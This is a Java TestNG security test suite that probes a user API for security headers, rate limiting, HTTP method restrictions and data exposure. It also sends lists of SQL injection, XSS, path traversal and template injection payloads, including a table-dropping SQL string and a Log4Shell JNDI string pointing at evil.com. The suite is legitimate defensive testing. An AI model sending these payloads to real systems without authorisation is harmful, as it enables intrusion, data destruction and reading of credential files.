package com.api.automation.security;

import com.api.automation.base.BaseTest;
import com.api.automation.builders.ApiRequestBuilder;
import com.api.automation.utils.ExtentReportManager;
import io.restassured.response.Response;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.testng.Assert;
import org.testng.annotations.Test;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Security testing suite for API endpoints
 * Tests for common security vulnerabilities and best practices
 */
public class SecurityTestSuite extends BaseTest {
    
    private static final Logger logger = LogManager.getLogger(SecurityTestSuite.class);
    
    @Test(groups = {"security"}, priority = 1)
    public void testSecurityHeaders() {
        logger.info("Testing security headers");
        ExtentReportManager.logInfo("Starting security headers validation test");
        
        Response response = ApiRequestBuilder.create()
                .withEndpoint("/api/users/1")
                .get();
        
        // Check for important security headers
        Map<String, String> expectedHeaders = new HashMap<>();
        expectedHeaders.put("X-Content-Type-Options", "nosniff");
        expectedHeaders.put("X-Frame-Options", "DENY");
        expectedHeaders.put("X-XSS-Protection", "1; mode=block");
        expectedHeaders.put("Strict-Transport-Security", "max-age=31536000");
        expectedHeaders.put("Content-Security-Policy", "default-src 'self'");
        
        StringBuilder headerReport = new StringBuilder("Security Headers Analysis:\n");
        int presentHeaders = 0;
        
        for (Map.Entry<String, String> header : expectedHeaders.entrySet()) {
            String headerValue = response.getHeader(header.getKey());
            boolean isPresent = headerValue != null;
            
            if (isPresent) {
                presentHeaders++;
                headerReport.append("✓ ").append(header.getKey()).append(": ").append(headerValue).append("\n");
                ExtentReportManager.logPass("Security header present: " + header.getKey());
            } else {
                headerReport.append("✗ ").append(header.getKey()).append(": MISSING\n");
                ExtentReportManager.logWarning("Security header missing: " + header.getKey());
            }
        }
        
        ExtentReportManager.logInfo(headerReport.toString());
        
        // Note: Many public APIs don't implement all security headers
        // This test documents the current state rather than failing
        logger.info("Security headers test completed. {}/{} headers present", 
                   presentHeaders, expectedHeaders.size());
    }
    
    @Test(groups = {"security"}, priority = 2)
    public void testSqlInjectionAttempts() {
        logger.info("Testing SQL injection vulnerabilities");
        ExtentReportManager.logInfo("Starting SQL injection vulnerability test");
        
        String[] sqlInjectionPayloads = {
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "1' OR '1'='1' --",
            "admin'--",
            "' OR 1=1#"
        };
        
        for (String payload : sqlInjectionPayloads) {
            logger.info("Testing SQL injection payload: {}", payload);
            
            Response response = ApiRequestBuilder.create()
                    .withEndpoint("/api/users")
                    .withQueryParam("search", payload)
                    .get();
            
            // Check that the API doesn't return sensitive error information
            String responseBody = response.getBody().asString().toLowerCase();
            
            boolean containsSqlError = responseBody.contains("sql") || 
                                     responseBody.contains("mysql") || 
                                     responseBody.contains("syntax error") ||
                                     responseBody.contains("database");
            
            if (containsSqlError) {
                ExtentReportManager.logFail("Potential SQL injection vulnerability detected with payload: " + payload);
                logger.warn("SQL error information exposed with payload: {}", payload);
            } else {
                ExtentReportManager.logPass("SQL injection payload handled safely: " + payload);
            }
            
            // API should return appropriate status codes (not 500 internal server error)
            Assert.assertTrue(response.getStatusCode() < 500, 
                            "API should not return 500 error for malicious input: " + payload);
        }
        
        ExtentReportManager.logPass("SQL injection vulnerability test completed");
        logger.info("SQL injection vulnerability test completed");
    }
    
    @Test(groups = {"security"}, priority = 3)
    public void testXssVulnerabilities() {
        logger.info("Testing XSS vulnerabilities");
        ExtentReportManager.logInfo("Starting XSS vulnerability test");
        
        String[] xssPayloads = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//"
        };
        
        for (String payload : xssPayloads) {
            logger.info("Testing XSS payload: {}", payload);
            
            // Test in query parameters
            Response getResponse = ApiRequestBuilder.create()
                    .withEndpoint("/api/users")
                    .withQueryParam("name", payload)
                    .get();
            
            String responseBody = getResponse.getBody().asString();
            
            // Check if the payload is reflected without proper encoding
            if (responseBody.contains(payload)) {
                ExtentReportManager.logWarning("Potential XSS vulnerability: payload reflected in response");
                logger.warn("XSS payload reflected in response: {}", payload);
            } else {
                ExtentReportManager.logPass("XSS payload properly handled: " + payload);
            }
            
            // Test in POST body
            Map<String, String> postData = new HashMap<>();
            postData.put("name", payload);
            postData.put("job", "tester");
            
            Response postResponse = ApiRequestBuilder.create()
                    .withEndpoint("/api/users")
                    .withBody(postData)
                    .post();
            
            String postResponseBody = postResponse.getBody().asString();
            
            if (postResponseBody.contains(payload)) {
                ExtentReportManager.logWarning("Potential XSS vulnerability in POST response");
                logger.warn("XSS payload reflected in POST response: {}", payload);
            } else {
                ExtentReportManager.logPass("XSS payload in POST properly handled: " + payload);
            }
        }
        
        ExtentReportManager.logPass("XSS vulnerability test completed");
        logger.info("XSS vulnerability test completed");
    }
    
    @Test(groups = {"security"}, priority = 4)
    public void testAuthenticationBypass() {
        logger.info("Testing authentication bypass attempts");
        ExtentReportManager.logInfo("Starting authentication bypass test");
        
        // Test accessing protected endpoints without authentication
        String[] protectedEndpoints = {
            "/api/users/1",
            "/api/users",
            "/api/admin/users"
        };
        
        for (String endpoint : protectedEndpoints) {
            logger.info("Testing endpoint without auth: {}", endpoint);
            
            Response response = ApiRequestBuilder.create()
                    .withEndpoint(endpoint)
                    .get();
            
            int statusCode = response.getStatusCode();
            
            // Check if endpoint properly requires authentication
            if (statusCode == 200) {
                ExtentReportManager.logWarning("Endpoint accessible without authentication: " + endpoint);
                logger.warn("Potential authentication bypass for endpoint: {}", endpoint);
            } else if (statusCode == 401 || statusCode == 403) {
                ExtentReportManager.logPass("Endpoint properly protected: " + endpoint);
            } else {
                ExtentReportManager.logInfo("Endpoint returned status " + statusCode + ": " + endpoint);
            }
        }
        
        ExtentReportManager.logPass("Authentication bypass test completed");
        logger.info("Authentication bypass test completed");
    }
    
    @Test(groups = {"security"}, priority = 5)
    public void testInputValidation() {
        logger.info("Testing input validation");
        ExtentReportManager.logInfo("Starting input validation test");
        
        // Test with various malicious inputs
        String[] maliciousInputs = {
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "<%= 7*7 %>",
            "#{7*7}",
            "null",
            "undefined",
            String.valueOf(Integer.MAX_VALUE),
            "A".repeat(10000) // Very long string
        };
        
        for (String input : maliciousInputs) {
            logger.info("Testing malicious input: {}", input.substring(0, Math.min(50, input.length())));
            
            Map<String, String> userData = new HashMap<>();
            userData.put("name", input);
            userData.put("job", "tester");
            
            Response response = ApiRequestBuilder.create()
                    .withEndpoint("/api/users")
                    .withBody(userData)
                    .post();
            
            // Check for proper input validation
            if (response.getStatusCode() == 400) {
                ExtentReportManager.logPass("Input validation working: rejected malicious input");
            } else if (response.getStatusCode() == 500) {
                ExtentReportManager.logFail("Server error with malicious input - potential vulnerability");
                logger.warn("Server error (500) with input: {}", input);
            } else {
                ExtentReportManager.logInfo("Input accepted with status: " + response.getStatusCode());
            }
        }
        
        ExtentReportManager.logPass("Input validation test completed");
        logger.info("Input validation test completed");
    }
    
    @Test(groups = {"security"}, priority = 6)
    public void testRateLimiting() {
        logger.info("Testing rate limiting");
        ExtentReportManager.logInfo("Starting rate limiting test");
        
        int requestCount = 50;
        int rateLimitThreshold = 30; // Assume rate limit is around 30 requests
        
        List<Response> responses = new java.util.ArrayList<>();
        
        // Send multiple requests rapidly
        for (int i = 0; i < requestCount; i++) {
            Response response = ApiRequestBuilder.create()
                    .withEndpoint("/api/users")
                    .withQueryParam("page", "1")
                    .get();
            
            responses.add(response);
            
            // Check for rate limiting response
            if (response.getStatusCode() == 429) {
                ExtentReportManager.logPass("Rate limiting detected at request " + (i + 1));
                logger.info("Rate limiting triggered at request {}", i + 1);
                break;
            }
        }
        
        // Analyze rate limiting behavior
        long rateLimitedResponses = responses.stream()
                .mapToInt(Response::getStatusCode)
                .filter(code -> code == 429)
                .count();
        
        if (rateLimitedResponses > 0) {
            ExtentReportManager.logPass("Rate limiting is implemented");
        } else {
            ExtentReportManager.logWarning("No rate limiting detected - potential DoS vulnerability");
            logger.warn("No rate limiting detected after {} requests", requestCount);
        }
        
        ExtentReportManager.logPass("Rate limiting test completed");
        logger.info("Rate limiting test completed");
    }
    
    @Test(groups = {"security"}, priority = 7)
    public void testDataExposure() {
        logger.info("Testing sensitive data exposure");
        ExtentReportManager.logInfo("Starting sensitive data exposure test");
        
        Response response = ApiRequestBuilder.create()
                .withEndpoint("/api/users/1")
                .get();
        
        String responseBody = response.getBody().asString().toLowerCase();
        
        // Check for sensitive data patterns
        String[] sensitivePatterns = {
            "password",
            "secret",
            "token",
            "key",
            "ssn",
            "social security",
            "credit card",
            "api_key",
            "private_key"
        };
        
        boolean sensitiveDataFound = false;
        StringBuilder exposureReport = new StringBuilder("Sensitive Data Exposure Analysis:\n");
        
        for (String pattern : sensitivePatterns) {
            if (responseBody.contains(pattern)) {
                sensitiveDataFound = true;
                exposureReport.append("⚠ Potential sensitive data: ").append(pattern).append("\n");
                ExtentReportManager.logWarning("Potential sensitive data exposure: " + pattern);
            }
        }
        
        if (!sensitiveDataFound) {
            exposureReport.append("✓ No obvious sensitive data patterns detected\n");
            ExtentReportManager.logPass("No sensitive data patterns detected in response");
        }
        
        ExtentReportManager.logInfo(exposureReport.toString());
        
        ExtentReportManager.logPass("Sensitive data exposure test completed");
        logger.info("Sensitive data exposure test completed");
    }
    
    @Test(groups = {"security"}, priority = 8)
    public void testHttpMethodSecurity() {
        logger.info("Testing HTTP method security");
        ExtentReportManager.logInfo("Starting HTTP method security test");
        
        String endpoint = "/api/users/1";
        
        // Test various HTTP methods
        String[] httpMethods = {"OPTIONS", "HEAD", "TRACE", "CONNECT"};
        
        for (String method : httpMethods) {
            logger.info("Testing HTTP method: {}", method);
            
            try {
                Response response = ApiRequestBuilder.create()
                        .withEndpoint(endpoint)
                        .execute(method);
                
                if (response.getStatusCode() == 200) {
                    ExtentReportManager.logWarning("HTTP method " + method + " is allowed - potential security risk");
                } else if (response.getStatusCode() == 405) {
                    ExtentReportManager.logPass("HTTP method " + method + " properly restricted");
                } else {
                    ExtentReportManager.logInfo("HTTP method " + method + " returned status: " + response.getStatusCode());
                }
                
            } catch (Exception e) {
                ExtentReportManager.logInfo("HTTP method " + method + " not supported or blocked");
            }
        }
        
        ExtentReportManager.logPass("HTTP method security test completed");
        logger.info("HTTP method security test completed");
    }
}
